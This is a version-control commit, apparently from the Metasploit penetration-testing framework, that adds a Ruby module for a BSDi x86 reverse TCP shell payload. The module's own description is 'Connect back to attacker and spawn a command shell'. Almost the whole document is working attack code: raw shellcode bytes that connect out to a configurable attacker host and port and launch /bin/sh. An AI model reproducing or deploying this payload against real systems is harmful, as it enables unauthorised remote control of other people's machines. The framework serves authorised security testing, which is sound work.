b66a1dae2d2e627f4a24840f4fb1934b6425ed5b
Matt Miller <mmiller@hick.org>
2005-10-11 07:37:10 +0000

    bsdi singles
    git-svn-id: file:///home/svn/incoming/trunk@2959 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/bsdi/x86/shell_reverse_tcp.rb
@@ -0,0 +1,44 @@
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Bsdi
+module X86
+
+module ShellReverseTcp
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'BSDi Command Shell, Reverse TCP Inline',
+			'Version'       => '$Revision$',
+			'Description'   => 'Connect back to attacker and spawn a command shell',
+			'Author'        => [ 'skape', 'optyx' ],
+			'Platform'      => 'bsdi',
+			'Arch'          => ARCH_X86,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'Payload'       =>
+				{
+					'Offsets' =>
+						{
+							'LHOST'    => [ 0x1c, 'ADDR' ],
+							'LPORT'    => [ 0x23, 'n'    ],
+						},
+					'Payload' =>
+						"\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" +
+						"\x52\x42\x52\x42\x52\x6a\x61\x58\xff\xd6\x97\x68\x7f\x00\x00\x01" +
+						"\x68\x10\x02\xbf\xbf\x89\xe3\x6a\x10\x53\x57\x6a\x62\x58\xff\xd6" +
+						"\xb0\x5a\x52\x57\xff\xd6\x4a\x79\xf7\x50\x68\x2f\x2f\x73\x68\x68" +
+						"\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\xff\xd6"
+				}
+		))
+	end
+
+end
+
+end end end end end
